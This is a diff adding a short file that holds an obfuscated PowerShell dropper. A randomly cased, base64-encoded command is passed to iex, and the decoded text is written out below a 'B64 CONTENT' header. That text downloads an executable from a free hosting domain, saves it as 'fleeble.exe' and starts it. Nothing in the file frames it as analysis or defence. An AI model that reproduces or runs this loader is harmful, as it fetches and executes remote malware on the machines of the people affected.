@@ -1,0 +1,7 @@
+iex([sYSTeM.teXT.ENCoDIng]::utf8.gEtStRINg([SYsteM.CONVErt]::froMBaSe64stRinG('CihOZXctT2JqZWN0IFNZc1RlbS5ORVQud0ViY2xJRW5UKS5kb3dubE9BRGZpTGUoJ2h0dHA6Ly9tYXRrYWx2LjVnYmZyZWUuY29tL2xvc28vZmFzb28uZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYsTem.NET.wEbclIEnT).downlOADfiLe('http://matkalv.5gbfree.com/loso/fasoo.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
